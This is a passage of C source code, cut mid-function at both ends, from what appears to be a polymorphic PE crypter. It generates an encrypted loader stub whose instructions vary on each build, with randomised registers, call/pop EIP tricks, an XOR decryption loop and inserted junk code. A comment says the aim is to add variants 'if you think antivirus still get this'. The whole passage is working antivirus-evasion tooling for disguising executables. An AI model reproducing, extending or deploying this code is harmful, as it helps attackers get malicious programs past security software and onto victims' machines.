                                        if(LDice<7)LAddr=LSize-11;      //1 push, 5 push, 1 pop, 2 call, 1 pop, 1 pop
                                        else LAddr=LSize-13;            //1 push, 5 push, 1 pop, 2 call, 3 add, 1 pop
                                }
                                CallReg32(LPB,LReg);
                                PutRandomBuffer(LPB,LAddr);
                                switch(LDice)
                                {
                                case 1:
                                case 2:
                                case 5:
                                case 6:
                                        PopReg32(LPB,LReg);
                                        break;
                                default:
                                        AddReg32Num8(LPB,REG_ESP,4);
                                }
                                PopReg32(LPB,LReg);
                        }else
*/
//                      if((76<=LDice)&&(LDice<=94))    //use loop + jeczx
                        if((38<=LDice)&&(LDice<=56))    //use loop + jeczx
                        {                                                               
                                if((LSize-3)<0x7D) LAddr=LSize-4;
                                else LAddr=0x7C;
                                LAddr=Random(LAddr)+2;
                                LoopNum8(LPB,(BYTE)LAddr);
                                JecxzNum8(LPB,(BYTE)LAddr-2);
                                PutRandomBuffer(LPB,LAddr-2);
                                IncReg32(LPB,REG_ECX);
                                LDecSize=LAddr+3;
                        }else
                        //if((95<=LDice)&&(LDice<=100)) //use back loop
                        if((57<=LDice)&&(LDice<=63))    //use back loop
                        {
                                if(LSize-7<0x7D) LAddr=LSize-7;
                                else LAddr=0x75;
                                LAddr=Random(LAddr)+3;
                                PushReg32(LPB,REG_ECX);
                                MovzxEcxCl(LPB);                        //don't wanna wait if ecx = 0
                                GenerateRubbishCode(LPB,LAddr-3,0);
                                LPB+=LAddr-3;
                                LoopNum8(LPB,(BYTE)(0xFE-(BYTE)LAddr));
                                PopReg32(LPB,REG_ECX);

                                LDecSize=LAddr+4;
                        }
                        LSize-=LDecSize;
                }
        }
}
//----------------------------------------------------------------------------------
/*procedure GenerateInitCode(ACodePtr,AKeyPtr,AData1Ptr,ASize1,AData2Ptr,ASize2,ADynLoadAddr,
                           AMainPtr,AEntryPointAddr,AImpThunk:Cardinal);*/
//this is the POLY-decoder and loader
//see the end of this function to know what it finally does
//don't forget to fixup pointers of some instructions
//add more variants for each instruction if you think antivirus still get this


 typedef struct _POLY_CONTEXT{
  BYTE DataSizeRegister;
  BYTE DataAddrRegister;
  BYTE EipRegister;
  BYTE KeyAddrRegister;
  BYTE KeyBytesRegister;
  BYTE FreeRegisters[2];
}POLY_CONTEXT, *PPOLY_CONTEXT;

VAR_INSTRUCTION LInitInstr[InitInstrCount];
DWORD LVirtAddr,LRubbishSize,LDelta,LDelta2,LRemaining,LCodeStart,LEIPSub;
PBYTE LPB;
POLY_CONTEXT PolyContext;
#ifndef STATIC_CONTEXT
BOOL LRegUsed[Reg32Count];
int LNotUsed;
BYTE LReg;
#endif
//returns pointer on instruction
PBYTE InstructionAddress(DWORD AInstruction)
{
        return((PBYTE)(InitData+LInitInstr[AInstruction].VirtualAddress-LCodeStart));
}

//returns relative delta between two instructions for call
DWORD CallAddress(DWORD AFromInstruction,DWORD AToInstruction) 
{
        return(LInitInstr[AToInstruction].VirtualAddress
           -(LInitInstr[AFromInstruction].VirtualAddress+5));
}

//returns relative delta between two instructions for conditional jump
DWORD JcxAddress(DWORD AFromInstruction,DWORD AToInstruction)
{
        return(LInitInstr[AToInstruction].VirtualAddress
                   -(LInitInstr[AFromInstruction].VirtualAddress+6));
}

DWORD InsVAddr(DWORD AInstr)
{
        return(LInitInstr[AInstr].VirtualAddress);
}

BYTE InsFix1(DWORD AInstr)
{
        return(LInitInstr[AInstr].Vars[LInitInstr[AInstr].Index].Fix1);
}

BYTE InsFix2(DWORD AInstr)
{
        return(LInitInstr[AInstr].Vars[LInitInstr[AInstr].Index].Fix2);
}

BYTE InsFix3(DWORD AInstr)
{
        return(LInitInstr[AInstr].Vars[LInitInstr[AInstr].Index].Fix3);
}

BYTE InsFix4(DWORD AInstr)
{
        return(LInitInstr[AInstr].Vars[LInitInstr[AInstr].Index].Fix4);
}

void FixInstr(DWORD AInstr,DWORD AFix1,DWORD AFix2=DWORD(-1))
{
        if(InsFix1(AInstr)!=BYTE(-1))
        {
                LPB=InstructionAddress(AInstr);
                LPB+=InsFix1(AInstr);
                memcpy(LPB,&AFix1,4);
        }
        if((InsFix2(AInstr)!=BYTE(-1))&&(AFix2!=DWORD(-1)))
        {
                LPB=InstructionAddress(AInstr);
                LPB+=InsFix2(AInstr);
                memcpy(LPB,&AFix2,4);
        }
}
//-------------------------------------------
 //procedure GeneratePolyInstruction(AInstruction,ARegister:Byte);
#ifdef STATIC_CONTEXT
BYTE LReg;
#endif
BYTE LFreeReg,LFreeRegOther,LAnyReg;

BYTE CtxFreeReg()
{
        BYTE LIdx;
        LIdx=(BYTE)Random(10) % 2;
        LFreeReg=PolyContext.FreeRegisters[LIdx];
        LFreeRegOther=PolyContext.FreeRegisters[(LIdx+1) % 2];
        return(LFreeReg);
}

BYTE CtxAnyRegEsp()
{
    LAnyReg=RandomReg32Esp();
        return(LAnyReg);
}

void GeneratePolyInstruction(BYTE AInstruction,BYTE ARegister)
{
        PBYTE LPB;
        switch(AInstruction)
        {
        case PII_POLY_PUSHAD:
                LInitInstr[AInstruction].Count=2;
                LInitInstr[AInstruction].Vars[0].Len=1;
                LPB=(PBYTE)&LInitInstr[AInstruction].Vars[0].Code;
                Pushad(LPB);    
                LInitInstr[AInstruction].Vars[1].Len=8;
                LPB=(PBYTE)&LInitInstr[AInstruction].Vars[1].Code;
                PushReg32(LPB,REG_EAX);
                PushReg32(LPB,REG_ECX);
                PushReg32(LPB,REG_EDX);
                PushReg32(LPB,REG_EBX);
                LInitInstr[AInstruction].Vars[1].Len+=LeaReg32Reg32MemIdx8(LPB,REG_EAX,REG_ESP,0x10);
                PushReg32(LPB,REG_EAX);
                PushReg32(LPB,REG_EBP);
                PushReg32(LPB,REG_ESI);
                PushReg32(LPB,REG_EDI);
                break;

        case PII_POLY_MOV_REG_LOADER_SIZE:
        case PII_POLY_MOV_REG_LOADER_ADDR:
        case PII_CODER_MOV_REG_KEY:
                LInitInstr[AInstruction].Count=4;
                LInitInstr[AInstruction].Vars[0].Len=5;
                LInitInstr[AInstruction].Vars[0].Fix1=1;
                LPB=(PBYTE)&LInitInstr[AInstruction].Vars[0].Code;
                MovReg32Num32(LPB,ARegister,0x12345678);
                        
                LInitInstr[AInstruction].Vars[1].Len=6;
                LInitInstr[AInstruction].Vars[1].Fix1=1;
                LPB=(PBYTE)&LInitInstr[AInstruction].Vars[1].Code;
                PushNum32(LPB,0x12345678);
                PopReg32(LPB,ARegister);
                        
                LInitInstr[AInstruction].Vars[2].Len=5;
                LInitInstr[AInstruction].Vars[2].Fix1=1;
                LPB=(PBYTE)&LInitInstr[AInstruction].Vars[2].Code;
                MovReg32Num32(LPB,CtxFreeReg(),0x12345678);
                LInitInstr[AInstruction].Vars[2].Len+=XchgReg32Reg32(LPB,LFreeReg,ARegister);
                        
                LInitInstr[AInstruction].Vars[3].Len=6;
                LInitInstr[AInstruction].Vars[3].Fix1=2;
                LPB=(PBYTE)&LInitInstr[AInstruction].Vars[3].Code[0];
                LeaReg32Addr32(LPB,ARegister,0x12345678);
                break;

        case PII_POLY_JMP_DYNLOADER:
                LInitInstr[AInstruction].Count=3;
                LInitInstr[AInstruction].Vars[0].Len=5;
                LInitInstr[AInstruction].Vars[0].Fix1=1;
                LInitInstr[AInstruction].Vars[0].Fix2=0;
                LPB=(PBYTE)&LInitInstr[AInstruction].Vars[0].Code;
                RelJmpAddr32(LPB,0x12345678);
                        
                LInitInstr[AInstruction].Vars[1].Len=8;
                LInitInstr[AInstruction].Vars[1].Fix1=4;
                LInitInstr[AInstruction].Vars[1].Fix2=3;
                LPB=(PBYTE)&LInitInstr[AInstruction].Vars[1].Code;
                LReg=RandomReg32Esp();
                XorReg32Reg32(LPB,LReg,LReg);
                RelJzAddr32(LPB,0x12345678);
                        
                LInitInstr[AInstruction].Vars[2].Len=7;
                LInitInstr[AInstruction].Vars[2].Fix1=3;
                LInitInstr[AInstruction].Vars[2].Fix2=2;
                LPB=(PBYTE)&LInitInstr[AInstruction].Vars[2].Code;
                DecReg32(LPB,PolyContext.EipRegister);
                RelJnzAddr32(LPB,0x12345678);
                break;

        case PII_CODER_CALL_GET_EIP:
                LInitInstr[AInstruction].Count=4;
                LInitInstr[AInstruction].Vars[0].Len=5;
                LInitInstr[AInstruction].Vars[0].Fix1=1;
                LInitInstr[AInstruction].Vars[0].Fix2=0;
                LInitInstr[AInstruction].Vars[0].Fix3=5;
                LPB=(PBYTE)&LInitInstr[AInstruction].Vars[0].Code;
                RelCallAddr(LPB,0x12345678);
                        
                LInitInstr[AInstruction].Vars[1].Len=12;
                LInitInstr[AInstruction].Vars[1].Fix1=3;
                LInitInstr[AInstruction].Vars[1].Fix2=2;
                LInitInstr[AInstruction].Vars[1].Fix3=12;
                LPB=(PBYTE)&LInitInstr[AInstruction].Vars[1].Code;
                RelJmpAddr8(LPB,5);
                RelJmpAddr32(LPB,0x12345678);
                RelCallAddr(LPB,DWORD(-10));
                        
                LInitInstr[AInstruction].Vars[2].Len=5;
                LInitInstr[AInstruction].Vars[2].Fix1=BYTE(-1);
                LInitInstr[AInstruction].Vars[2].Fix2=BYTE(-1);
                LInitInstr[AInstruction].Vars[2].Fix3=5;
                LPB=(PBYTE)&LInitInstr[AInstruction].Vars[2].Code;
                RelCallAddr(LPB,0);
                        
                LInitInstr[AInstruction].Vars[3].Len=9;
                LInitInstr[AInstruction].Vars[3].Fix1=BYTE(-1);
                LInitInstr[AInstruction].Vars[3].Fix2=BYTE(-1);
                LInitInstr[AInstruction].Vars[3].Fix3=9;
                LPB=(PBYTE)&LInitInstr[AInstruction].Vars[3].Code;
                RelJmpAddr8(LPB,2);
                RelJmpAddr8(LPB,5);
                RelCallAddr(LPB,DWORD(-7));
                break;

        case PII_CODER_GET_EIP:
                LInitInstr[AInstruction].Count=4;
                LInitInstr[AInstruction].Vars[0].Len=1;
                LPB=(PBYTE)&LInitInstr[AInstruction].Vars[0].Code;
                PopReg32(LPB,ARegister);
                        
                LInitInstr[AInstruction].Vars[1].Len=3;
                LPB=(PBYTE)&LInitInstr[AInstruction].Vars[1].Code;
                LInitInstr[AInstruction].Vars[1].Len+=MovReg32RegMem(LPB,ARegister,REG_ESP);
                AddReg32Num8(LPB,REG_ESP,4);
                        
                LInitInstr[AInstruction].Vars[2].Len=3;
                LPB=(PBYTE)&LInitInstr[AInstruction].Vars[2].Code;
                AddReg32Num8(LPB,REG_ESP,4);
                LInitInstr[AInstruction].Vars[2].Len+=MovReg32RegMemIdx8(LPB,ARegister,REG_ESP,BYTE(-4));
                        
                LInitInstr[AInstruction].Vars[3].Len=4;
                LPB=(PBYTE)&LInitInstr[AInstruction].Vars[3].Code;
                LInitInstr[AInstruction].Vars[3].Len+=MovReg32RegMem(LPB,ARegister,REG_ESP);
                IncReg32(LPB,REG_ESP);
                IncReg32(LPB,REG_ESP);
                IncReg32(LPB,REG_ESP);
                IncReg32(LPB,REG_ESP);
                break;

        case PII_CODER_FIX_DST_PTR:
        case PII_CODER_FIX_SRC_PTR:
                LInitInstr[AInstruction].Count=4;
                LInitInstr[AInstruction].Vars[0].Len=2;
                LPB=(PBYTE)&LInitInstr[AInstruction].Vars[0].Code;
                AddReg32Reg32(LPB,ARegister,PolyContext.EipRegister);
                        
                LInitInstr[AInstruction].Vars[1].Len=6;
                LPB=(PBYTE)&LInitInstr[AInstruction].Vars[1].Code;
                PushReg32(LPB,PolyContext.EipRegister);
                AddReg32Reg32(LPB,PolyContext.EipRegister,ARegister);
                MovReg32Reg32(LPB,ARegister,PolyContext.EipRegister);
                PopReg32(LPB,PolyContext.EipRegister);
                        
                LInitInstr[AInstruction].Vars[2].Len=6;
                LPB=(PBYTE)&LInitInstr[AInstruction].Vars[2].Code;
                PushReg32(LPB,PolyContext.EipRegister);
                AddReg32Reg32(LPB,PolyContext.EipRegister,ARegister);
                PushReg32(LPB,PolyContext.EipRegister);
                PopReg32(LPB,ARegister);
                PopReg32(LPB,PolyContext.EipRegister);
                        
                LInitInstr[AInstruction].Vars[3].Len=2;
                LPB=(PBYTE)&LInitInstr[AInstruction].Vars[3].Code;
                PushReg32(LPB,PolyContext.EipRegister);
                LInitInstr[AInstruction].Vars[3].Len+=AddReg32RegMem(LPB,ARegister,REG_ESP);
                PopReg32(LPB,PolyContext.EipRegister);
                break;

        case PII_CODER_LOAD_KEY_TO_REG:
                LInitInstr[AInstruction].Count=4;
                LPB=(PBYTE)&LInitInstr[AInstruction].Vars[0].Code;
                LInitInstr[AInstruction].Vars[0].Len=MovReg32RegMem(LPB,ARegister,PolyContext.KeyAddrRegister);
                        
                LInitInstr[AInstruction].Vars[1].Len=1;
                LPB=(PBYTE)&LInitInstr[AInstruction].Vars[1].Code;
                LInitInstr[AInstruction].Vars[1].Len+=PushRegMem(LPB,PolyContext.KeyAddrRegister);
                PopReg32(LPB,ARegister);
                        
                LPB=(PBYTE)&LInitInstr[AInstruction].Vars[2].Code;
                LInitInstr[AInstruction].Vars[2].Len=LeaReg32Reg32(LPB,ARegister,PolyContext.KeyAddrRegister);
                LInitInstr[AInstruction].Vars[2].Len+=MovReg32RegMem(LPB,ARegister,ARegister);
                        
                LInitInstr[AInstruction].Vars[3].Len=2;
                LPB=(PBYTE)&LInitInstr[AInstruction].Vars[3].Code;
                XorReg32Reg32(LPB,ARegister,ARegister);
                LInitInstr[AInstruction].Vars[3].Len+=AddReg32RegMem(LPB,ARegister,PolyContext.KeyAddrRegister);
                break;

   case PII_CODER_TEST_KEY_END:
                LInitInstr[AInstruction].Count=4;
                LPB=(PBYTE)&LInitInstr[AInstruction].Vars[0].Code;
                LInitInstr[AInstruction].Vars[0].Len=TestReg32Num32(LPB,ARegister,0xFF000000);
                        
                LPB=(PBYTE)&LInitInstr[AInstruction].Vars[1].Code;
                LInitInstr[AInstruction].Vars[1].Len=TestRegMemNum32(LPB,PolyContext.KeyAddrRegister,0xFF000000);
                        
                LPB=(PBYTE)&LInitInstr[AInstruction].Vars[2].Code;
                LInitInstr[AInstruction].Vars[2].Len=7;
                MovReg32Reg32(LPB,CtxFreeReg(),ARegister);
                ShrReg32Num8(LPB,LFreeReg,0x18);
                TestReg32Reg32(LPB,LFreeReg,LFreeReg);
                        
                LPB=(PBYTE)&LInitInstr[AInstruction].Vars[3].Code;
                LInitInstr[AInstruction].Vars[3].Len=11;
                PushReg32(LPB,ARegister);
                PopReg32(LPB,CtxFreeReg());
                AndReg32Num32(LPB,LFreeReg,0xFF000000);
                CmpReg32Num8(LPB,LFreeReg,0);
                break;

        case PII_CODER_JZ_CODER_BEGIN:
                LInitInstr[AInstruction].Count=2;
                LPB=(PBYTE)&LInitInstr[AInstruction].Vars[0].Code;
                LInitInstr[AInstruction].Vars[0].Len=6;
                LInitInstr[AInstruction].Vars[0].Fix1=2;
                LInitInstr[AInstruction].Vars[0].Fix2=0;
                RelJzAddr32(LPB,0x12345678);
                        
                LPB=(PBYTE)&LInitInstr[AInstruction].Vars[1].Code;
                LInitInstr[AInstruction].Vars[1].Len=7;
                LInitInstr[AInstruction].Vars[1].Fix1=3;
                LInitInstr[AInstruction].Vars[1].Fix2=1;
                RelJnzAddr8(LPB,5);
                RelJmpAddr32(LPB,0x12345678);
                break;

        case PII_CODER_ADD_DATA_IDX:
                LInitInstr[AInstruction].Count=4;
                LPB=(PBYTE)&LInitInstr[AInstruction].Vars[0].Code;
                LInitInstr[AInstruction].Vars[0].Len=2;
                AddReg32Reg32(LPB,ARegister,PolyContext.DataSizeRegister);
                        
                LPB=(PBYTE)&LInitInstr[AInstruction].Vars[1].Code;
                LInitInstr[AInstruction].Vars[1].Len=2;
                PushReg32(LPB,PolyContext.DataSizeRegister);
                LInitInstr[AInstruction].Vars[1].Len+=AddReg32RegMem(LPB,ARegister,REG_ESP);
                PopReg32(LPB,PolyContext.DataSizeRegister);
                        
                LPB=(PBYTE)&LInitInstr[AInstruction].Vars[2].Code;
                LInitInstr[AInstruction].Vars[2].Len=6;
                PushReg32(LPB,CtxFreeReg());
                MovReg32Reg32(LPB,LFreeReg,PolyContext.DataSizeRegister);
                AddReg32Reg32(LPB,ARegister,LFreeReg);
                PopReg32(LPB,LFreeReg);
                        
                LPB=(PBYTE)&LInitInstr[AInstruction].Vars[3].Code;
                LInitInstr[AInstruction].Vars[3].Len=2;
                PushReg32(LPB,ARegister);
                LInitInstr[AInstruction].Vars[3].Len+=AddRegMemReg32(LPB,REG_ESP,PolyContext.DataSizeRegister);
                PopReg32(LPB,ARegister);
                break;

        case PII_CODER_XOR_DATA_REG:
                LInitInstr[AInstruction].Count=4;
                LPB=(PBYTE)&LInitInstr[AInstruction].Vars[0].Code;
                LInitInstr[AInstruction].Vars[0].Len=XorReg32RegMem(LPB,ARegister,PolyContext.DataAddrRegister);
                        
                LPB=(PBYTE)&LInitInstr[AInstruction].Vars[1].Code;
                LInitInstr[AInstruction].Vars[1].Len=3;
                PushReg32(LPB,CtxFreeReg());
                LInitInstr[AInstruction].Vars[1].Len+=PushRegMem(LPB,PolyContext.DataAddrRegister);
                LInitInstr[AInstruction].Vars[1].Len+=XorReg32RegMem(LPB,ARegister,REG_ESP);
                PopReg32(LPB,LFreeReg);
                PopReg32(LPB,LFreeReg);
                        
                LPB=(PBYTE)&LInitInstr[AInstruction].Vars[2].Code;
                LInitInstr[AInstruction].Vars[2].Len=4;
                PushReg32(LPB,CtxFreeReg());
                LInitInstr[AInstruction].Vars[2].Len+=MovReg32RegMem(LPB,LFreeReg,PolyContext.DataAddrRegister);
                XorReg32Reg32(LPB,ARegister,LFreeReg);
                PopReg32(LPB,LFreeReg);
                        
                LPB=(PBYTE)&LInitInstr[AInstruction].Vars[3].Code;
                LInitInstr[AInstruction].Vars[3].Len=4;
                PushReg32(LPB,CtxFreeReg());
                LInitInstr[AInstruction].Vars[3].Len+=MovReg32RegMem(LPB,LFreeReg,PolyContext.DataAddrRegister);
                PushReg32(LPB,LFreeReg);
                LInitInstr[AInstruction].Vars[3].Len+=XorRegMemReg32(LPB,REG_ESP,ARegister);
                PopReg32(LPB,ARegister);
                PopReg32(LPB,LFreeReg);
                break;

        case PII_CODER_STORE_DATA:
                LInitInstr[AInstruction].Count=4;
                LPB=(PBYTE)&LInitInstr[AInstruction].Vars[0].Code;
                LInitInstr[AInstruction].Vars[0].Len=1;
                        
                if((PolyContext.DataAddrRegister!=REG_EDI)||(PolyContext.KeyBytesRegister!=REG_EAX))
                {
                        if (PolyContext.DataAddrRegister!=REG_EDI) LInitInstr[AInstruction].Vars[0].Len+=6;
                        if (PolyContext.DataAddrRegister!=REG_EDI) PushReg32(LPB,REG_EDI);
                                
                        if (PolyContext.DataAddrRegister!=REG_EAX) LInitInstr[AInstruction].Vars[0].Len+=2;
                        if (PolyContext.DataAddrRegister!=REG_EAX) PushReg32(LPB,REG_EAX);
                                
                        if (PolyContext.DataAddrRegister!=REG_EDI) PushReg32(LPB,PolyContext.DataAddrRegister);
                        PushReg32(LPB,PolyContext.KeyBytesRegister);
                        PopReg32(LPB,REG_EAX);
                        if (PolyContext.DataAddrRegister!=REG_EDI) PopReg32(LPB,REG_EDI);
                        LInitInstr[AInstruction].Vars[0].Len+=4;
                }
                Stosd(LPB);
                if((PolyContext.DataAddrRegister!=REG_EDI)||(PolyContext.KeyBytesRegister!=REG_EAX))
                {
                                PushReg32(LPB,REG_EAX);
                                if (PolyContext.DataAddrRegister!=REG_EDI) PushReg32(LPB,REG_EDI);
                                if (PolyContext.DataAddrRegister!=REG_EDI) PopReg32(LPB,PolyContext.DataAddrRegister);
                                PopReg32(LPB,PolyContext.KeyBytesRegister);
                                if (PolyContext.DataAddrRegister!=REG_EAX) PopReg32(LPB,REG_EAX);
                                if (PolyContext.DataAddrRegister!=REG_EDI) PopReg32(LPB,REG_EDI);
                }
                LPB=(PBYTE)&LInitInstr[AInstruction].Vars[1].Code;
                LInitInstr[AInstruction].Vars[1].Len=4;
                LInitInstr[AInstruction].Vars[1].Len+=MovRegMemReg32(LPB,PolyContext.DataAddrRegister,ARegister);
                IncReg32(LPB,PolyContext.DataAddrRegister);
                IncReg32(LPB,PolyContext.DataAddrRegister);
                IncReg32(LPB,PolyContext.DataAddrRegister);
                IncReg32(LPB,PolyContext.DataAddrRegister);
                        
                LPB=(PBYTE)&LInitInstr[AInstruction].Vars[2].Code;
                LInitInstr[AInstruction].Vars[2].Len=5;
                PushReg32(LPB,CtxFreeReg());
                LInitInstr[AInstruction].Vars[2].Len+=XchgReg32Reg32(LPB,REG_ESP,PolyContext.DataAddrRegister);
                PopReg32(LPB,LFreeReg);
                PushReg32(LPB,ARegister);
                PopReg32(LPB,LFreeReg);
                LInitInstr[AInstruction].Vars[2].Len+=XchgReg32Reg32(LPB,PolyContext.DataAddrRegister,REG_ESP);
                PopReg32(LPB,LFreeReg);
                        
                LPB=(PBYTE)&LInitInstr[AInstruction].Vars[3].Code;
                LInitInstr[AInstruction].Vars[3].Len=2;
                        
                if(ARegister==REG_EDI)
                {
                        MovReg32Reg32(LPB,CtxFreeReg(),REG_EDI);
                        LInitInstr[AInstruction].Vars[3].Len+=2;
                }
                        
                if(PolyContext.DataAddrRegister!=REG_EDI)
                {
                        PushReg32(LPB,REG_EDI);
                        MovReg32Reg32(LPB,REG_EDI,PolyContext.DataAddrRegister);
                        LInitInstr[AInstruction].Vars[3].Len+=6;
                }
                if(ARegister==REG_EDI) PushReg32(LPB,LFreeReg);
                else PushReg32(LPB,ARegister);
                LInitInstr[AInstruction].Vars[3].Len+=XchgReg32Reg32(LPB,REG_ESI,REG_ESP);
                Movsd(LPB);
                LInitInstr[AInstruction].Vars[3].Len+=XchgReg32Reg32(LPB,REG_ESP,REG_ESI);
                if(PolyContext.DataAddrRegister!=REG_EDI)
                {
                        MovReg32Reg32(LPB,PolyContext.DataAddrRegister,REG_EDI);
                        PopReg32(LPB,REG_EDI);
                }
                break;

        case PII_CODER_INC_SRC_PTR:
                LInitInstr[AInstruction].Count=4;
                LPB=(PBYTE)&LInitInstr[AInstruction].Vars[0].Code;
                LInitInstr[AInstruction].Vars[0].Len=1;
                IncReg32(LPB,ARegister);
                        
                LPB=(PBYTE)&LInitInstr[AInstruction].Vars[1].Code;
                LInitInstr[AInstruction].Vars[1].Len=3;
                AddReg32Num8(LPB,ARegister,1);
                        
                LPB=(PBYTE)&LInitInstr[AInstruction].Vars[2].Code;
                LInitInstr[AInstruction].Vars[2].Len=3;
                SubReg32Num8(LPB,ARegister,BYTE(-1));
                        
                LPB=(PBYTE)&LInitInstr[AInstruction].Vars[3].Code;
                LInitInstr[AInstruction].Vars[3].Len=7;
                PushReg32(LPB,CtxFreeReg());
                PushNum8(LPB,1);
                PopReg32(LPB,LFreeReg);
                AddReg32Reg32(LPB,ARegister,LFreeReg);
                PopReg32(LPB,LFreeReg);
                break;

        case PII_CODER_LOOP_CODER_CODE:
                LInitInstr[AInstruction].Count=1;
                LPB=(PBYTE)&LInitInstr[AInstruction].Vars[0].Code;
                LInitInstr[AInstruction].Vars[0].Len=7;
                LInitInstr[AInstruction].Vars[0].Fix1=3;
                LInitInstr[AInstruction].Vars[0].Fix2=1;
                DecReg32(LPB,ARegister);
                RelJnzAddr32(LPB,0x12345678);
                break;
        }
}

//-------------------------------------------
void GenerateInitCode(DWORD ACodePtr,DWORD AKeyPtr,DWORD AData1Ptr,
                                          DWORD ASize1,DWORD AData2Ptr,DWORD ASize2,DWORD ADynLoadAddr,
                      DWORD AMainPtr,DWORD AEntryPointAddr,DWORD AImpThunk)
{
        int i;
        ASize1=ASize1 >> 2;
        // ASize2=ASize2 >> 2;

        ZeroMemory(&LInitInstr,sizeof(LInitInstr));

         //generate random context
        #ifndef STATIC_CONTEXT
        PolyContext.DataSizeRegister=REG_NON;
        PolyContext.DataAddrRegister=REG_NON;
        PolyContext.EipRegister=REG_NON;
        PolyContext.KeyAddrRegister=REG_NON;
        PolyContext.KeyBytesRegister=REG_NON;
        PolyContext.FreeRegisters[0]=REG_NON;
        PolyContext.FreeRegisters[1]=REG_NON;
        #else

//  PolyContext.DataSizeRegister=REG_ESI;
//  PolyContext.DataAddrRegister=REG_EBP;
//  PolyContext.EipRegister=REG_ECX;
//  PolyContext.KeyAddrRegister=REG_EAX;
//  PolyContext.KeyBytesRegister=REG_EBX;
//  PolyContext.FreeRegisters[0]=REG_EDI;
//  PolyContext.FreeRegisters[1]=REG_EDX;
        PolyContext.DataSizeRegister=REG_EAX;
        PolyContext.DataAddrRegister=REG_EBX;
        PolyContext.EipRegister=REG_ECX;
        PolyContext.KeyAddrRegister=REG_EDX;
        PolyContext.KeyBytesRegister=REG_ESI;
        PolyContext.FreeRegisters[0]=REG_EDI;
        PolyContext.FreeRegisters[1]=REG_EBP;
        #endif

        #ifndef  STATIC_CONTEXT
        for(i=0;i<Reg32Count;i++)LRegUsed[i]=FALSE;
        LNotUsed=Reg32Count-1;
        while(LNotUsed>0)
        {
                LReg=(BYTE)Random(Reg32Count);
                while(LRegUsed[LReg] ||(LReg==REG_ESP))
                {
                        LReg=(LReg+1) % Reg32Count;
                }
                LRegUsed[LReg]=TRUE;

                switch(LNotUsed)
                {
                case 1:
                        PolyContext.DataSizeRegister=LReg; 
                        break;

                case 2:
                        PolyContext.DataAddrRegister=LReg; 
                        break;

                case 3:
                        PolyContext.EipRegister=LReg; 
                        break;

                case 4:
                        PolyContext.KeyAddrRegister=LReg; 
                        break;

                case 5:
                        PolyContext.KeyBytesRegister=LReg; 
                        break;

                case 6:
                        PolyContext.FreeRegisters[0]=LReg; 
                        break;

                case 7:
                        PolyContext.FreeRegisters[1]=LReg; 
                        break;
                }
                LNotUsed--;
        }
        #endif

        // these lines are good for debugging
        // PolyContext.DataSizeRegister=REG_ESI;
        // PolyContext.DataAddrRegister=REG_EBX;
        // PolyContext.EipRegister=REG_EDX;
        // PolyContext.KeyAddrRegister=REG_EBP;
        // PolyContext.KeyBytesRegister=REG_EAX;
        // PolyContext.FreeRegisters[0]=REG_ECX;
        // PolyContext.FreeRegisters[1]=REG_EDI;

        GeneratePolyInstruction(PII_POLY_PUSHAD,REG_NON);
        GeneratePolyInstruction(PII_POLY_MOV_REG_LOADER_SIZE,PolyContext.DataSizeRegister);
        GeneratePolyInstruction(PII_POLY_MOV_REG_LOADER_ADDR,PolyContext.DataAddrRegister);

        GeneratePolyInstruction(PII_CODER_CALL_GET_EIP,REG_NON);
        GeneratePolyInstruction(PII_CODER_GET_EIP,PolyContext.EipRegister);
        GeneratePolyInstruction(PII_CODER_FIX_DST_PTR,PolyContext.DataAddrRegister);
        GeneratePolyInstruction(PII_CODER_MOV_REG_KEY,PolyContext.KeyAddrRegister);
        GeneratePolyInstruction(PII_CODER_FIX_SRC_PTR,PolyContext.KeyAddrRegister);
        GeneratePolyInstruction(PII_CODER_LOAD_KEY_TO_REG,PolyContext.KeyBytesRegister);
        GeneratePolyInstruction(PII_CODER_TEST_KEY_END,PolyContext.KeyBytesRegister);
        GeneratePolyInstruction(PII_CODER_JZ_CODER_BEGIN,REG_NON);
        GeneratePolyInstruction(PII_CODER_ADD_DATA_IDX,PolyContext.KeyBytesRegister);
        GeneratePolyInstruction(PII_CODER_XOR_DATA_REG,PolyContext.KeyBytesRegister);
        GeneratePolyInstruction(PII_CODER_STORE_DATA,PolyContext.KeyBytesRegister);
        GeneratePolyInstruction(PII_CODER_INC_SRC_PTR,PolyContext.KeyAddrRegister);
        GeneratePolyInstruction(PII_CODER_LOOP_CODER_CODE,PolyContext.DataSizeRegister);
        GeneratePolyInstruction(PII_POLY_JMP_DYNLOADER,REG_NON);
        
        //
        //now put some rubbish, select instruction and write it there
        //then put some rubbish, select next instruction and write it there
        //then put some ...
        //
        //but be careful with PII_CODER_TEST_KEY_END and PII_CODER_JZ_CODER_BEGIN instructions which is test and condition jump
        //don't put the rubbish between them
        //

        ZeroMemory(InitData,InitSize);
        LRemaining=InitSize;
        
        LPB=(PBYTE)InitData;
        LCodeStart=NtHeaders.OptionalHeader.ImageBase+NtHeaders.OptionalHeader.AddressOfEntryPoint;
        LVirtAddr=LCodeStart;

        ///LInitInstr[LI]. 
        for(i=0;i<InitInstrCount;i++)
        {
                LDelta=InitInstrCount-i;
                LDelta2=LRemaining-LDelta*10;
                LRubbishSize=Random(DWORD(LDelta2 / LDelta));
                if((i!=PII_CODER_JZ_CODER_BEGIN)&&(LRubbishSize>0))//can't change flags after test
                {
                        GenerateRubbishCode(LPB,LRubbishSize,LVirtAddr);
                        LPB+=LRubbishSize;
                        LVirtAddr+=LRubbishSize;
                        LRemaining-=LRubbishSize;
                }
                LInitInstr[i].VirtualAddress=LVirtAddr;
                LInitInstr[i].Index=(BYTE)Random(LInitInstr[i].Count);
                CopyMemory(LPB,&LInitInstr[i].Vars[LInitInstr[i].Index].Code,LInitInstr[i].Vars[LInitInstr[i].Index].Len);
                LPB+=LInitInstr[i].Vars[LInitInstr[i].Index].Len;
                LVirtAddr+=LInitInstr[i].Vars[LInitInstr[i].Index].Len;
                LRemaining-=LInitInstr[i].Vars[LInitInstr[i].Index].Len;
        }

        LRubbishSize=Random(LRemaining);
        GenerateRubbishCode(LPB,LRubbishSize,LVirtAddr);
        LRemaining-=LRubbishSize;
        LPB+=LRubbishSize;
        LRubbishSize=LRemaining;
        GenerateRandomBuffer(LPB,LRubbishSize);
                
        //
        //now correct pointers
        //
        
        //we do call and pop for getting eip
        //but we need only imagebase so we need to subtract rva of this call
        LEIPSub=InsVAddr(PII_CODER_CALL_GET_EIP)-ACodePtr+InsFix3(PII_CODER_CALL_GET_EIP);

        FixInstr(PII_POLY_MOV_REG_LOADER_SIZE,ASize1);
        FixInstr(PII_POLY_MOV_REG_LOADER_ADDR,AData1Ptr-LEIPSub);
        
